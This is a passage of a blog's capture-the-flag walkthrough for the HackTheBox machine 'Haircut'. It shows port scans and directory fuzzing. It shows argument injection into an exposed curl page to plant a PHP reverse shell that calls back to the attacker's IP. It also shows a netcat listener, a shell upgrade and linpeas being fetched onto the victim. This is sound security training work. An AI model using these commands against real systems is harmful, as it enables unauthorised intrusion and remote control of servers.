@@ -1,0 +1,335 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Haircut | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Haircut from HackTheBox."> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo1.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/13_haircut/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Biscotti</span> Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/bounties/">bounties </a> </li> <li class="nav-item "> <a class="nav-link" href="/cves/">cves </a> </li> <li class="nav-item "> <a class="nav-link" href="/presentations/">talks </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">publications </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Haircut</h1> <p class="post-description">Haircut from HackTheBox.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/haircut/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="HTB Haircut Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br></p> <h2>Link</h2> <p><a href="https://app.hackthebox.com/Haircut" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> Time for a haircut!</p> <p>Per the usual, start off with a nmap scan to get all of the open ports.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/haircut]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">-oN</span> nmap 10.10.10.24                    
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-19 18:51 AEDT
+Nmap scan report <span class="k">for </span>10.10.10.24
+Host is up <span class="o">(</span>0.0089s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    nginx 1.10.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title:  HTB Hairdresser 
+|_http-server-header: nginx/1.10.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Device <span class="nb">type</span>: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
+Network Distance: 2 hops
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE <span class="o">(</span>using port 143/tcp<span class="o">)</span>
+HOP RTT      ADDRESS
+1   59.53 ms 10.10.16.1
+2   10.14 ms 10.10.10.24
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>10.75 seconds
+</code></pre></div></div> <p><br> Run nmap against all the ports to look for any weird ports that are open.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/haircut]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-oN</span> nmapfull 10.10.10.24                      
+Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-19 18:53 AEDT
+Nmap scan report <span class="k">for </span>10.10.10.24
+Host is up <span class="o">(</span>0.080s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>10.64 seconds
+</code></pre></div></div> <p><br> Check the landing page and view its source.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/haircut/landing.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the Landing Page" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>view-source:http://10.10.10.24/
+
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+
+<span class="nt">&lt;title&gt;</span> HTB Hairdresser <span class="nt">&lt;/title&gt;</span>
+
+<span class="nt">&lt;center&gt;</span> <span class="nt">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
+<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"bounce.jpg"</span> <span class="na">height=</span><span class="s">"750"</span> <span class="na">width=</span><span class="s">"1200"</span> <span class="na">alt=</span><span class="s">""</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;center&gt;</span>
+</code></pre></div></div> <p><br> Run ffuf to brute-force for interesting directories or files. Look for html or php extensions.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/haircut]
+└─<span class="nv">$ </span>ffuf <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.10.10.24/FUZZ <span class="nt">-fw</span> 11 <span class="nt">-e</span> .html,.php
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.24/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Extensions       : .html .php 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 11
+________________________________________________
+
+uploads                 [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 13ms]
+test.html               [Status: 200, Size: 223, Words: 14, Lines: 7, Duration: 11ms]
+exposed.php             [Status: 200, Size: 446, Words: 24, Lines: 20, Duration: 14ms]
+:: Progress: [661680/661680] :: Job [1/1] :: 2469 req/sec :: Duration: [0:04:10] :: Errors: 0 ::jpg" height="750" width="1200" alt="" /&gt;
+&lt;center&gt;
+</span></code></pre></div></div> <p><br> Navigate to the exposed.php to see what it is.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/haircut/exposed.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Check the Exposed Page" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Try to run the page functionality. Looks like a curl command.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/haircut/expotrial.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Exposed Trial Run" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Download the pentestmonkey php reverse shell script.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/haircut]
+└─<span class="nv">$ </span>wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php <span class="nt">-O</span> shell.php
+<span class="nt">--2025-01-19</span> 19:13:59--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
+Resolving raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>... 185.199.111.133, 2606:50c0:8003::154, 2606:50c0:8002::154, ...
+Connecting to raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>|185.199.111.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5491 <span class="o">(</span>5.4K<span class="o">)</span> <span class="o">[</span>text/plain]
+Saving to: ‘shell.php’
+
+shell.php                                                  100%[<span class="o">========================================================================================================================================&gt;]</span>   5.36K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.01s   
+
+2025-01-19 19:14:00 <span class="o">(</span>485 KB/s<span class="o">)</span> - ‘shell.php’ saved <span class="o">[</span>5491/5491]
+</code></pre></div></div> <p><br> Update the IP address to the HackTheBox VPN IP address. Update the port that will be used for the attack port.</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="c1">// php-reverse-shell - A Reverse Shell implementation in PHP</span>
+<span class="c1">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span>
+<span class="c1">//</span>
+<span class="c1">// This tool may be used for legal purposes only.  Users take full responsibility</span>
+<span class="c1">// for any actions performed using this tool.  The author accepts no liability</span>
+<span class="c1">// for damage caused by this tool.  If these terms are not acceptable to you, then</span>
+<span class="c1">// do not use this tool.</span>
+
+<span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
+
+<span class="nb">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">"1.0"</span><span class="p">;</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'10.10.16.3'</span><span class="p">;</span>  <span class="c1">// CHANGE THIS</span>
+<span class="nv">$port</span> <span class="o">=</span> <span class="mi">1234</span><span class="p">;</span>       <span class="c1">// CHANGE THIS</span>
+<span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">443</span><span class="p">;</span>
+<span class="nv">$write_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+<span class="nv">$error_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+<span class="nv">$shell</span> <span class="o">=</span> <span class="s1">'uname -a; w; id; /bin/sh -i'</span><span class="p">;</span>
+<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div> <p><br> Start a netcat listener.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/haircut]
+└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 1234
+listening on <span class="o">[</span>any] 1234 ...
+</code></pre></div></div> <p><br> Use python to start a web server to serve the ptm reverse shell that was just updated.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/haircut]
+└─<span class="nv">$ </span><span class="nb">sudo </span>python <span class="nt">-m</span> http.server 80             
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</code></pre></div></div> <p><br> Fiddle with the command. I tried injecting a semicolon and double ampersand for injection. There is some kind of check that those aren’t appropriate characters for a url. I also tried using the -o command to the web root at /var/www/html and got permission denied. Finally, output to the uploads folder that was discovered in the ffuf.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.16.3/shell.php <span class="nt">-o</span> /var/www/html/uploads/shell.php
+</code></pre></div></div> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/haircut/injectedcurl.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Injected Curl" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Navigate to the shell that was just uploaded in the uploads folder.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/haircut/penshell.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Uploaded Shell" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Check the listener and catch the shell. Use python to updgrade the shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/haircut]
+└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 1234
+listening on <span class="o">[</span>any] 1234 ...
+connect to <span class="o">[</span>10.10.16.3] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.24] 51970
+Linux haircut 4.4.0-78-generic <span class="c">#99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 09:29:31 up 39 min,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ python3 -c '</span>import pty<span class="p">;</span> pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="p">;</span><span class="s1">'
+www-data@haircut:/$ 
+</span></code></pre></div></div> <p><br> Get the user.txt flag.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@haircut:/home/maria<span class="nv">$ </span><span class="nb">cat </span>user.txt
+<span class="nb">cat </span>user.txt
+&lt;redacted&gt;
+www-data@haircut:/home/maria<span class="nv">$ </span>ifconfig
+ifconfig
+ens160    Link encap:Ethernet  HWaddr 00:50:56:b9:9a:4c  
+          inet addr:10.10.10.24  Bcast:10.10.10.255  Mask:255.255.255.0
+          inet6 addr: fe80::250:56ff:feb9:9a4c/64 Scope:Link
+          inet6 addr: dead:beef::250:56ff:feb9:9a4c/64 Scope:Global
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:1131333 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1125547 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:190200376 <span class="o">(</span>190.2 MB<span class="o">)</span>  TX bytes:426772575 <span class="o">(</span>426.7 MB<span class="o">)</span>
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:250 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:250 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:23525 <span class="o">(</span>23.5 KB<span class="o">)</span>  TX bytes:23525 <span class="o">(</span>23.5 KB<span class="o">)</span>
+</code></pre></div></div> <p><br> There is another user.txt on the user desktop. Weird.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@haircut:/home/maria/Desktop<span class="nv">$ </span><span class="nb">cat </span>user.txt
+<span class="nb">cat </span>user.txt
+ &lt;redacted&gt;
+www-data@haircut:/home/maria/Desktop<span class="nv">$ </span>ip a
+ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    <span class="nb">link</span>/ether 00:50:56:b9:9a:4c brd ff:ff:ff:ff:ff:ff
+    inet 10.10.10.24/24 brd 10.10.10.255 scope global ens160
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef::250:56ff:feb9:9a4c/64 scope global mngtmpaddr dynamic 
+       valid_lft 86398sec preferred_lft 14398sec
+    inet6 fe80::250:56ff:feb9:9a4c/64 scope <span class="nb">link 
+       </span>valid_lft forever preferred_lft forever
+</code></pre></div></div> <p><br> Download linpeas.sh.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/haircut]
+└─<span class="nv">$ </span>wget https://github.com/peass-ng/PEASS-ng/releases/download/20250113-4426d62e/linpeas.sh                                   
+<span class="nt">--2025-01-19</span> 19:39:51--  https://github.com/peass-ng/PEASS-ng/releases/download/20250113-4426d62e/linpeas.sh
+Resolving github.com <span class="o">(</span>github.com<span class="o">)</span>... 4.237.22.38
+Connecting to github.com <span class="o">(</span>github.com<span class="o">)</span>|4.237.22.38|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/a36145da-bdb8-4fba-af77-22dc24ac95e1?X-Amz-Algorithm<span class="o">=</span>AWS4-HMAC-SHA256&amp;X-Amz-Credential<span class="o">=</span>releaseassetproduction%2F20250119%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date<span class="o">=</span>20250119T084011Z&amp;X-Amz-Expires<span class="o">=</span>300&amp;X-Amz-Signature<span class="o">=</span>8097f7081f98e18773c8656373f3156aa276b598ea423ca8e1475dd573e5f36a&amp;X-Amz-SignedHeaders<span class="o">=</span>host&amp;response-content-disposition<span class="o">=</span>attachment%3B%20filename%3Dlinpeas.sh&amp;response-content-type<span class="o">=</span>application%2Foctet-stream <span class="o">[</span>following]
+<span class="nt">--2025-01-19</span> 19:39:51--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/a36145da-bdb8-4fba-af77-22dc24ac95e1?X-Amz-Algorithm<span class="o">=</span>AWS4-HMAC-SHA256&amp;X-Amz-Credential<span class="o">=</span>releaseassetproduction%2F20250119%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date<span class="o">=</span>20250119T084011Z&amp;X-Amz-Expires<span class="o">=</span>300&amp;X-Amz-Signature<span class="o">=</span>8097f7081f98e18773c8656373f3156aa276b598ea423ca8e1475dd573e5f36a&amp;X-Amz-SignedHeaders<span class="o">=</span>host&amp;response-content-disposition<span class="o">=</span>attachment%3B%20filename%3Dlinpeas.sh&amp;response-content-type<span class="o">=</span>application%2Foctet-stream
+Resolving objects.githubusercontent.com <span class="o">(</span>objects.githubusercontent.com<span class="o">)</span>... 185.199.109.133, 185.199.111.133, 185.199.108.133, ...
+Connecting to objects.githubusercontent.com <span class="o">(</span>objects.githubusercontent.com<span class="o">)</span>|185.199.109.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 830426 <span class="o">(</span>811K<span class="o">)</span> <span class="o">[</span>application/octet-stream]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                                                 100%[<span class="o">========================================================================================================================================&gt;]</span> 810.96K  3.30MB/s    <span class="k">in </span>0.2s    
+
+2025-01-19 19:39:53 <span class="o">(</span>3.30 MB/s<span class="o">)</span> - ‘linpeas.sh’ saved <span class="o">[</span>830426/830426]
+</code></pre></div></div> <p><br> Transfer linpeas to the victim machine.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@haircut:/home/maria<span class="nv">$ </span><span class="nb">cd</span> /dev/shm
+<span class="nb">cd</span> /dev/shm
+www-data@haircut:/dev/shm<span class="nv">$ </span>wget http://10.10.16.3:8000/linpeas.sh
+wget http://10.10.16.3:8000/linpeas.sh
+<span class="nt">--2025-01-19</span> 09:40:39--  http://10.10.16.3:8000/linpeas.sh
+Connecting to 10.10.16.3:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 830426 <span class="o">(</span>811K<span class="o">)</span> <span class="o">[</span>text/x-sh]
+Saving to: <span class="s1">'linpeas.sh'</span>
+
+linpeas.sh          100%[<span class="o">===================&gt;]</span> 810.96K  1.04MB/s    <span class="k">in </span>0.8s    
+
+2025-01-19 09:40:40 <span class="o">(</span>1.04 MB/s<span class="o">)</span> - <span class="s1">'linpeas.sh'</span> saved <span class="o">[</span>830426/830426]
+www-data@haircut:/dev/shm<span class="nv">$ </span><span class="nb">chmod</span> +x linpeas.sh
+<span class="nb">chmod</span> +x linpeas.sh
+</code></pre></div></div> <p><br> Run the linpeas.sh. Note the first kernel exploit.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@haircut:/dev/shm<span class="nv">$ </span>./linpeas.sh
+./linpeas.sh
+
+
+
+                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
+         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
+         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
+               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
+                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀
+
+    /---------------------------------------------------------------------------------<span class="se">\</span>
+    |                             Do you like PEASS?                                  |                                                                                                                                                     
+    |---------------------------------------------------------------------------------|                                                                                                                                                     
+    |         Learn Cloud Hacking       :     https://training.hacktricks.wiki         |                                                                                                                                                    
+    |         Follow on Twitter         :     @hacktricks_live                        |                                                                                                                                                     
+    |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                     
+    |---------------------------------------------------------------------------------|                                                                                                                                                     
+    |                                 Thank you!                                      |                                                                                                                                                     
+    <span class="se">\-</span><span class="nt">--------------------------------------------------------------------------------</span>/     
+
+    &lt;snip&gt;
+
+    <span class="o">[</span>+] <span class="o">[</span>CVE-2017-16995] eBPF_verifier
+
+   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
+   Exposure: highly probable
+   Tags: <span class="nv">debian</span><span class="o">=</span>9.0<span class="o">{</span>kernel:4.9.0-3-amd64<span class="o">}</span>,fedora<span class="o">=</span>25|26|27,ubuntu<span class="o">=</span>14.04<span class="o">{</span>kernel:4.4.0-89-generic<span class="o">}</span>,[ <span class="nv">ubuntu</span><span class="o">=(</span>16.04|17.04<span class="o">)</span> <span class="o">]{</span>kernel:4.<span class="o">(</span>8|10<span class="o">)</span>.0-<span class="o">(</span>19|28|45<span class="o">)</span><span class="nt">-generic</span><span class="o">}</span>
+   Download URL: https://www.exploit-db.com/download/45010
